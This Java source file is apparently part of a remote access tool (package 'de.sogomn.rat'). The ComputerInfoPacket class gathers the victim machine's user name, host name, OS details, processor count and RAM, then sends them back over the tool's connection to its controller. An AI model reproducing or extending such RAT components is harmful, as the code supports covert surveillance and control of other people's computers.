package de.sogomn.rat.packet;

import java.net.InetAddress;
import java.net.UnknownHostException;

import de.sogomn.rat.ActiveConnection;

public class ComputerInfoPacket extends AbstractPingPongPacket {
	
	private String name, hostName, os, osVersion, osArchitecture;
	private int processors;
	private long ram;
	
	public ComputerInfoPacket() {
		//...
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUTF(name);
		connection.writeUTF(hostName);
		connection.writeUTF(os);
		connection.writeUTF(osVersion);
		connection.writeUTF(osArchitecture);
		connection.writeInt(processors);
		connection.writeLong(ram);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		name = connection.readUTF();
		hostName = connection.readUTF();
		os = connection.readUTF();
		osVersion = connection.readUTF();
		osArchitecture = connection.readUTF();
		processors = connection.readInt();
		ram = connection.readLong();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		name = System.getProperty("user.name");
		os = System.getProperty("os.name");
		osVersion = System.getProperty("os.version");
		osArchitecture = System.getProperty("os.arch");
		processors = Runtime.getRuntime().availableProcessors();
		ram = Runtime.getRuntime().totalMemory();
		
		try {
			hostName = InetAddress.getLocalHost().getHostName();
		} catch (final UnknownHostException ex) {
			hostName = "";
			
			ex.printStackTrace();
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getHostName() {
		return hostName;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getOsVersion() {
		return osVersion;
	}
	
	public String getOsArchitecture() {
		return osArchitecture;
	}
	
	public int getProcessors() {
		return processors;
	}
	
	public long getRam() {
		return ram;
	}
	
}
